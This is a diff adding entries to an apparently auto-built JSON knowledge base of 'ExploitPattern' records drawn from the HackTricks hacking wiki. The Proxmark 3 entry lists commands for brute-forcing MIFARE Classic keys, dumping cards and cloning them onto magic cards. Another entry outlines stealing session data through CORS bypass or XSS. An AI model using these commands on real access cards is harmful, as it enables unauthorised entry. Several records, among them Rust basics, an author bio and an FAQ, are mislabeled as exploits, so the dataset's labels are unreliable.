+      "For custom formats with simple checksums, differential analysis is the fastest way to derive the integrity function without reversing firmware."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-733",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Proxmark 3",
+    "description": "The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux). It has **16 sectors**, each of them has **4 blocks** and each block contains **16B**. The UID is in sector 0 block 0 (and can't be altered).\\ To access each sector you need **2 keys** (**A** and **B**) which are stored in **block 3 of each sector** (sector trailer). The sector trailer also stores the **access bits** that give the **read and write** permissions on **each block** using the 2 keys.\\",
+    "techniques": [
+      "`hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.",
+      "Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.",
+      "Many deployments use Classic \"value blocks\" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.",
+      "proxmark3> hf mf #List attacks",
+      "proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce",
+      "proxmark3> hf mf fchk 1 t # Improved keys BF",
+      "proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key",
+      "proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key",
+      "proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)",
+      "proxmark3> hf mf restore # Copy data to a new card",
+      "proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump",
+      "proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory",
+      "proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1",
+      "proxmark3> hf mf eget 01 # Read block 1",
+      "proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card",
+      "proxmark3> hf mf autopwn",
+      "proxmark3> hf mf cload -f modified.bin",
+      "proxmark3> hf mf csetuid -u",
+      "proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04",
+      "SAK : 08 [2]"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-734",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Sub-GHz RF",
+    "description": "Garage door openers typically operate at frequencies in the 300-190 MHz range, with the most common frequencies being 300 MHz, 310 MHz, 315 MHz, and 390 MHz. This frequency range is commonly used for garage door openers because it is less crowded than other frequency bands and is less likely to experience interference from other devices. Most car key fobs operate on either **315 MHz or 433 MHz**. These are both radio frequencies, and they are used in a variety of different applications. The main difference between the two frequencies is that 433 MHz has a longer range than 315 MHz. This means that 433 MHz is better for applications that require a longer range, such as remote keyless entry.\\",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-735",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Rust Basics",
+    "description": "Memory is managed through a system of ownership with the following rules that the compiler checks at compile time: 1. Each value in Rust has a variable that's called its owner. 2. There can only be one owner at a time. 3. When the owner goes out of scope, the value will be dropped. { // Scope of a variable is within the block it is declared in, which is denoted by brackets println!(\"The student is {} and teacher is {}\", student_age, teacher_age); } // when an owning variable goes out of scope, it will be dropped",
+    "techniques": [
+      "RustSec Advisory Database –",
+      "Cargo-vet: \"Auditing your Rust Dependencies\" –",
+      "Create a struct where 1 of their values could be any type",
+      "The Option type means that the value might by of type Some (there is something) or None:",
+      "You can use functions such as `is_some()` or `is_none()` to check the value of the Option.",
+      "Used for returning and propagating errors",
+      "You can use functions such as `is_ok()` or `is_err()` to check the value of the result",
+      "The `Option` enum should be used in situations where a value might not exist (be `None`).",
+      "The `Result` enum should be used in situations where you do something that might go wrong"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-736",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Stealing Sensitive Information Disclosure from a Web",
+    "description": "If at some point you find a **web page that presents you sensitive information based on your session**: Maybe it's reflecting cookies, or printing or CC details or any other sensitive information, you may try to steal it.\\ Here I present you the main ways to can try to achieve it: - [**CORS bypass**](../pentesting-web/cors-bypass.md): If you can bypass CORS headers you will be able to steal the information performing Ajax request for a malicious page. - [**XSS**](../pentesting-web/xss-cross-site-scripting/index.html): If you find a XSS vulnerability on the page you may be able to abuse it to steal the information.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-737",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Test LLMs",
+    "description": "Hugging Face Transformers is one of the most popular open-source libraries for using, training, and deploying LLMs such as GPT, BERT, and many others. It offers a comprehensive ecosystem that includes pre-trained models, datasets, and seamless integration with the Hugging Face Hub for fine-tuning and deployment. LangChain is a framework designed for building applications with LLMs. It allows developers to connect language models with external data sources, APIs, and databases. LangChain provides tools for advanced prompt engineering, managing conversation history, and integrating LLMs into complex workflows.",
+    "techniques": [
+      "Models: A vast repository of pre-trained machine learning models where users can browse, download, and integrate models for various tasks like text generation, translation, image recognition, and more.",
+      "Datasets: A comprehensive collection of datasets used for training and evaluating models. It facilitates easy access to diverse data sources, enabling users to find and utilize data for their specific machine learning projects.",
+      "Spaces: A platform for hosting and sharing interactive machine learning applications and demos. It allows developers to showcase their models in action, create user-friendly interfaces, and collaborate with others by sharing live demos.",
+      "Modules: A vast collection of pre-trained models and model components where users can browse, download, and integrate modules for tasks such as image classification, text embedding, and more.",
+      "Tutorials: Step-by-step guides and examples which helps users understand how to implement and fine-tune models using TensorFlow Hub.",
+      "Documentation: Comprehensive guides and API references that assist developers in effectively utilizing the repository’s resources.",
+      "Models: A repository of machine learning models contributed by the community which users can browse, try, and integrate models into their applications with minimal effort.",
+      "API Access: Simple APIs for running models the enable developers to deploy and scale models effortlessly within their own applications."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-738",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "About the author",
+    "description": "Credits for techniques from other researchers belong to the original authors (see references). Kudos to everyone who shares knowledge to improve internet security. HackTricks is an educational wiki about **cyber-security** led by Carlos with hundreds of collaborators. It's a **huge collection of hacking tricks** updated by the community as much as possible. If you find something missing or outdated, please send a **Pull Request** to the [**Hacktricks GitHub**](https://github.com/carlospolop/hacktricks)!",
+    "techniques": [
+      "Creator and maintainer of **PEASS‑ng** (winPEAS/linPEAS/macos‑peas) and the broader HackTricks knowledge base.",
+      "Red-team consultant and trainer focused on **cloud, identity, and endpoint privilege escalation**.",
+      "Regular instructor sharing reproducible attacker playbooks.",
+      "Frequent **PEASS‑ng releases** add checks for modern OS hardening (e.g., updated sudo/ADCS/Win11 telemetry bypasses) and richer JSON/HTML outputs—use the latest binaries.",
+      "Expanding **HackTricks Training** with hands-on cloud labs (AWS/Azure/GCP) and AI-assisted offensive workflows.",
+      "Partnering with training platforms on instructor-led cloud-security courses.",
+      "Track updates and changelogs in the **[PEASS‑ng releases](https://github.com/peass-ng/PEASS-ng/releases)** page.",
+      "Report new tricks or send PRs to keep HackTricks current.",
+      "For structured learning with the author, check the latest calendar at **[hacktricks-training.com](https://hacktricks-training.com/)**."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-739",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "HackTricks Values & FAQ",
+    "description": "> These are the **values of the HackTricks Project**: > - Give **FREE** access to **EDUCATIONAL hacking** resources to **ALL** Internet. >  - Hacking is about learning, and learning should be as free as possible. >  - The purpose of this book is to serve as a comprehensive **educational resource**. > - **STORE** awesome **hacking** techniques that the community publishes giving the **ORIGINAL** **AUTHORS** all the **credits**. >  - **We don't want the credit from other people**, we just want to store cool tricks for everyone.",
+    "techniques": [
+      "Improve your **SEO**",
+      "The content gets **translated to more than 15 languages** making possible for more people to access this content",
+      "HackTricks encourages people to check your page (several people has mentioned us that since some page of them is in HackTricks they receive more visits)",
+      "Attribution: You are free to:",
+      "Share — copy and redistribute the material in any medium or format.",
+      "Adapt — remix, transform, and build upon the material.",
+      "Third-Party Content: Some parts of this blog/book may include content from other sources, such as excerpts from other blogs or publications. The use of such content is done under the principles of fair use or with explicit permission from the respective copyright holders. Please refer to the original sources for specific licensing information regarding third-party content.",
+      "Authorship: The original content authored by HackTricks is subject to the terms of this license. You are encouraged to attribute this work to the author when sharing or adapting it.",
+      "Commercial Use: For inquiries regarding commercial use of this content, please contact me."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  }
+]
